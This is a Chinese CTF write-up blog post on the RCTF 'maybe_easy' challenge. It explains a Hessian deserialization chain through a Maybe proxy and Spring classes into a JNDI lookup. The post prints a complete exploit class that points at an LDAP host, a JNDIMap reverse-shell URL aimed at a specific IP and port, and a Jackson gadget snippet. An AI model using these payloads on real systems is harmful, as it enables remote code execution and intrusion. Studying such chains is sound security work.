@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言赛中感觉可以好好看一下，题目赛后看了看，跟着师傅的思路，感觉嗯也不是特别难，感觉前部分主要还是不太熟悉java里的一些写法，正好刚刚学习了Hessian反序列化的漏洞打法，建议复现学习的话可以跟一下N1ght师傅   要点其实看题目，给的并不复杂，留了个反序列化时候可能走的白名单，这里注意，存在jndi，可能最后要调用这个目录下的存在lookup调用的类的方法上，这里点一下，不着急再看这里实现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="rctf-maybe_easy">
+<meta property="og:url" content="https://hexo.sheep-sys-sudo.top/rctf-maybe-easy/index.html">
+<meta property="og:site_name" content="Sh_eePpppのHEXO">
+<meta property="og:description" content="前言赛中感觉可以好好看一下，题目赛后看了看，跟着师傅的思路，感觉嗯也不是特别难，感觉前部分主要还是不太熟悉java里的一些写法，正好刚刚学习了Hessian反序列化的漏洞打法，建议复现学习的话可以跟一下N1ght师傅   要点其实看题目，给的并不复杂，留了个反序列化时候可能走的白名单，这里注意，存在jndi，可能最后要调用这个目录下的存在lookup调用的类的方法上，这里点一下，不着急再看这里实现">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-11-20T14:40:25.000Z">
+<meta property="article:modified_time" content="2025-11-22T05:08:15.259Z">
+<meta property="article:author" content="Sh_eePppp">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>rctf-maybe_easy</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Sh_eePpppのHEXO" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-okaidia.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">h0me</a></li><!--
+     --><!--
+       --><li><a href="/categories">Categ0r1es</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Artic1es</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">Searh</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/Codeql%E5%AD%A6%E4%B9%A0%E4%B8%80/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/rctf%E5%90%8E%E6%84%9F/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/rctf-maybe-easy/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/rctf-maybe-easy/&text=rctf-maybe_easy"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/rctf-maybe-easy/&title=rctf-maybe_easy"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/rctf-maybe-easy/&is_video=false&description=rctf-maybe_easy"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=rctf-maybe_easy&body=Check out this article: https://hexo.sheep-sys-sudo.top/rctf-maybe-easy/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/rctf-maybe-easy/&title=rctf-maybe_easy"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/rctf-maybe-easy/&title=rctf-maybe_easy"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/rctf-maybe-easy/&title=rctf-maybe_easy"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/rctf-maybe-easy/&title=rctf-maybe_easy"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/rctf-maybe-easy/&name=rctf-maybe_easy&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/rctf-maybe-easy/&t=rctf-maybe_easy"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A6%81%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">要点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Codeql%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">Codeql分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jdk%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.2.</span> <span class="toc-text">jdk原生反序列化</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        rctf-maybe_easy
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Sh_eePppp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-11-20T14:40:25.000Z" class="dt-published" itemprop="datePublished">2025-11-20</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web/">web</a> › <a class="category-link" href="/categories/web/%E5%A4%8D%E7%8E%B0/">复现</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/java/" rel="tag">java</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>赛中感觉可以好好看一下，题目赛后看了看，跟着师傅的思路，感觉嗯也不是特别难，感觉前部分主要还是不太熟悉java里的一些写法，正好刚刚学习了Hessian反序列化的漏洞打法，建议复现学习的话可以跟一下N1ght师傅  </p>
+<h2 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h2><p>其实看题目，给的并不复杂，留了个反序列化时候可能走的白名单，这里注意，存在jndi，可能最后要调用这个目录下的存在lookup调用的类的方法上，这里点一下，不着急<br>再看这里实现了一个没有被使用的代理类Maybe  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public class Maybe extends Proxy implements Comparable&lt;Object&gt;, Serializable &#123;</span><br><span class="line">    public Maybe(InvocationHandler h) &#123;</span><br><span class="line">        super(h);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int compareTo(Object o) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Method method = Comparable.class.getMethod(&quot;compareTo&quot;, Object.class);</span><br><span class="line">            Object result = this.h.invoke(this, method, new Object[]&#123;o&#125;);</span><br><span class="line">            return (Integer)result;</span><br><span class="line">        &#125; catch (Throwable e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里就是关键点，这里专门代理了一个compareTo方法然后带到某些(InvocationHandler)类的invoke方法<br>假设不带这个Maybe，可以怎么打？<br>传统的打法就那几条链子了，但是白名单死了<br>所以必须借助这个代理类，打后续调用<br>这里可以Codeql，或者直接手查<br>找到这个类ObjectFactoryDelegatingInvocationHandler<br>这里调用了getObject方法（依旧限制白名单）<br>然后走到ObjectFactoryCreatingFactoryBean.java，然后调用getBean方法，走到lookup方法调用<br>实现jndi注入，本地复现的java版本是可以打Referer加载，我就这样打了，但是实际上，最好 还是打反序列化，比如jdk8&amp;spring的原生链，相当于高版本的退化版()   </p>
+<p>脚本直接打了 </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">package com.learn;</span><br><span class="line"></span><br><span class="line">import com.caucho.hessian.io.Hessian2Input;</span><br><span class="line">import com.caucho.hessian.io.Hessian2Output;</span><br><span class="line">import com.rctf.server.tool.Maybe;</span><br><span class="line">import org.springframework.beans.factory.BeanFactory;</span><br><span class="line">import org.springframework.beans.factory.ObjectFactory;</span><br><span class="line">import org.springframework.beans.factory.config.ObjectFactoryCreatingFactoryBean;</span><br><span class="line">import org.springframework.jndi.support.SimpleJndiBeanFactory;</span><br><span class="line"></span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.util.*;</span><br><span class="line"></span><br><span class="line">public class exp &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        SimpleJndiBeanFactory m=new SimpleJndiBeanFactory();</span><br><span class="line">        Class&lt;?&gt; outerClass = Class.forName(&quot;org.springframework.beans.factory.config.ObjectFactoryCreatingFactoryBean&quot;);</span><br><span class="line">        Class&lt;?&gt; innerClass = null;</span><br><span class="line">        for (Class&lt;?&gt; clazz : outerClass.getDeclaredClasses()) &#123;</span><br><span class="line">            if (&quot;TargetBeanObjectFactory&quot;.equals(clazz.getSimpleName())) &#123;</span><br><span class="line">                innerClass = clazz;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (innerClass == null) &#123;</span><br><span class="line">            throw new RuntimeException(&quot;找不到 TargetBeanObjectFactory 类&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; constructor = innerClass.getDeclaredConstructor(BeanFactory.class, String.class);</span><br><span class="line">        constructor.setAccessible(true);</span><br><span class="line">        // 5. 实例化 TargetBeanObjectFactory</span><br><span class="line">        ObjectFactory&lt;?&gt; targetBeanObjectFactory = (ObjectFactory&lt;?&gt;) constructor.newInstance(</span><br><span class="line">                m, &quot;ldap://x.x.x.x:1389/CommonsCollections6&quot;);</span><br><span class="line">        String inner = &quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(inner);</span><br><span class="line"></span><br><span class="line">        // 3. 构造函数只有一个参数 ObjectFactory</span><br><span class="line">        Constructor&lt;?&gt; constructor1 = clazz.getDeclaredConstructor(ObjectFactory.class);</span><br><span class="line">        constructor1.setAccessible(true);</span><br><span class="line"></span><br><span class="line">        // 4. 实例化 InvocationHandler</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) constructor1.newInstance(targetBeanObjectFactory);</span><br><span class="line">        Maybe exp=new Maybe(handler);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = new ByteArrayOutputStream();</span><br><span class="line">        Hessian2Output out = new Hessian2Output(bos);</span><br><span class="line">        out.getSerializerFactory().setAllowNonSerializable(true);</span><br><span class="line">        out.writeMapBegin(&quot;java.util.SortedMap&quot;);</span><br><span class="line">        out.writeObject(exp);</span><br><span class="line">        out.writeInt(1);</span><br><span class="line">        out.flush();</span><br><span class="line">        byte[] bytes = bos.toByteArray();</span><br><span class="line">        System.out.println(bytes);</span><br><span class="line">        ByteArrayInputStream bis = new ByteArrayInputStream(bytes);</span><br><span class="line">        Hessian2Input in = new Hessian2Input(bis);</span><br><span class="line">        in.readObject();//this._type.equals(SortedMap.class)</span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object obj, String field, Object value) throws NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = obj.getClass();</span><br><span class="line">        Field fieldName = clazz.getDeclaredField(field);</span><br><span class="line">        fieldName.setAccessible(true);</span><br><span class="line">        fieldName.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>这里是自己写的，第一次写Hessian的链子（）这里本地打的是Referer,版本不高，但是还是想学一下jdk的原生反序列化</p>
+<h3 id="Codeql分析"><a href="#Codeql分析" class="headerlink" title="Codeql分析"></a>Codeql分析</h3><p>我这里还是就着师傅发现的链子打的，还不能算我做到，决定跟着用Codeql分析一下，毕竟这道题白名单+特地方法很适合用Codeql构建数据库查询，然后比较关键的是存在jdk原生链可以打的<br>可以直接<code>codeql database create db-name --language=java --source-root=./sources --build-mode=none</code>  </p>
+<p>也可以用n1ght师傅的工具<br>都挺好的<br>构建之后的查询语句是 </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @name Empty block</span><br><span class="line"> * @kind problem</span><br><span class="line"> * @problem.severity warning</span><br><span class="line"> * @id java/example/empty-block</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import libs.Source</span><br><span class="line">import libs.DangerousMethods</span><br><span class="line"></span><br><span class="line">class InvokerHandler extends Class &#123;</span><br><span class="line">  InvokerHandler() &#123;</span><br><span class="line">    this.getASupertype*().getQualifiedName() = &quot;java.lang.reflect.InvocationHandler&quot; and</span><br><span class="line">    (</span><br><span class="line">      this.getQualifiedName().regexpMatch(&quot;java.util.+&quot;) or</span><br><span class="line">      this.getQualifiedName().regexpMatch(&quot;org.apache.commons.logging.+&quot;) or</span><br><span class="line">      this.getQualifiedName().regexpMatch(&quot;org.springframework.beans.+&quot;) or</span><br><span class="line">      this.getQualifiedName().regexpMatch(&quot;org.springframework.jndi.+&quot;)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class HessianObjectFactory extends Method &#123;</span><br><span class="line">  HessianObjectFactory() &#123;</span><br><span class="line">    // this.getASupertype*().getQualifiedName() = &quot;org.springframework.beans.factory.ObjectFactory&quot;</span><br><span class="line">    this.getName() = &quot;getObject&quot; and</span><br><span class="line">    this.hasNoParameters() and</span><br><span class="line">    (</span><br><span class="line">      this.getQualifiedName().regexpMatch(&quot;java.util.+&quot;) or</span><br><span class="line">      this.getQualifiedName().regexpMatch(&quot;org.apache.commons.logging.+&quot;) or</span><br><span class="line">      this.getQualifiedName().regexpMatch(&quot;org.springframework.beans.+&quot;) or</span><br><span class="line">      this.getQualifiedName().regexpMatch(&quot;org.springframework.jndi.+&quot;)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// from HessianObjectFactory i, DangerousMethod m</span><br><span class="line">// where i.calls(m)</span><br><span class="line">// select i</span><br><span class="line">from DangerousMethod m</span><br><span class="line">select m, m.getName()</span><br></pre></td></tr></table></figure></div>
+
+<p>语句并不难编写，得多写<br>后续就一直跟，第二条查询语句得到getObject方法调用的类，然后进一步在跟到getBean,这个方法在某个类中被调用会走到lookup，是一条将被学习的链子<br>这里突然翻到了一篇文章，好像和这道题高度类似()<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/17895">https://xz.aliyun.com/news/17895</a></p>
+<h3 id="jdk原生反序列化"><a href="#jdk原生反序列化" class="headerlink" title="jdk原生反序列化"></a>jdk原生反序列化</h3><p>一方面按照师傅方法学一学<br>另一方面学一学JNDImap工具jdk8+spring，可以jackson梭哈<br><code>ldap:/120.55.184.209:1389/Deserialize/Jackson/ReverseShell/120.55.184.209/65444</code><br>直接反弹shell<br>或者说只依赖spring的链子<br>可看<code>https://mak4r1.com/write-ups/spring-jackson%E5%8E%9F%E7%94%9F%E9%93%BE/</code><br><code>Jackson通过writeValueAsString将对象转为JSON字符串的时候，获取对象属性的时候会自动调用其getter方法。</code></p>
+<p>这个就是核心了，而Jackson里有关键类如<code>POJONode</code>or<code>ArrayNode</code>，可以通过toString被调用走到getter上<br>可以利用CC5提供了触发toString的链子or <code>EventListenerList</code><br>如上就这么多了，跟一跟学一学<br>like如此  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectMapper objmapper = new ObjectMapper();</span><br><span class="line">ArrayNode arrayNode =objmapper.createArrayNode();</span><br><span class="line">arrayNode.addPOJO(templates);</span><br><span class="line">arrayNode.toString();</span><br><span class="line"></span><br><span class="line">POJONode zxc=new POJONode(templates);</span><br><span class="line">zxc.toString();</span><br></pre></td></tr></table></figure></div>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">h0me</a></li>
+        
+          <li><a href="/categories">Categ0r1es</a></li>
+        
+          <li><a href="/archives/">Artic1es</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">Searh</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A6%81%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">要点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Codeql%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">Codeql分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jdk%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.2.</span> <span class="toc-text">jdk原生反序列化</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/rctf-maybe-easy/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/rctf-maybe-easy/&text=rctf-maybe_easy"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/rctf-maybe-easy/&title=rctf-maybe_easy"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/rctf-maybe-easy/&is_video=false&description=rctf-maybe_easy"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=rctf-maybe_easy&body=Check out this article: https://hexo.sheep-sys-sudo.top/rctf-maybe-easy/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/rctf-maybe-easy/&title=rctf-maybe_easy"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/rctf-maybe-easy/&title=rctf-maybe_easy"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/rctf-maybe-easy/&title=rctf-maybe_easy"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/rctf-maybe-easy/&title=rctf-maybe_easy"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/rctf-maybe-easy/&name=rctf-maybe_easy&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/rctf-maybe-easy/&t=rctf-maybe_easy"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Sh_eePppp
+  </div>
+
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">h0me</a></li><!--
+    --><!--
+      --><li><a href="/categories">Categ0r1es</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Artic1es</a></li><!--
+    --><!--
+      --><li><a href="/links/">L1nks</a></li><!--
+    --><!--
+      --><li><a href="/search/">Searh</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+
+  <!-- 邮箱信息独立出来，靠右下角 -->
+  <div class="footer-contact">
+    如果文章出现错误，可以联系我进行更改，感谢 
+    <a href="mailto:sh_eepppp@qq.com  ：）">sh_eepppp@qq.com</a>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
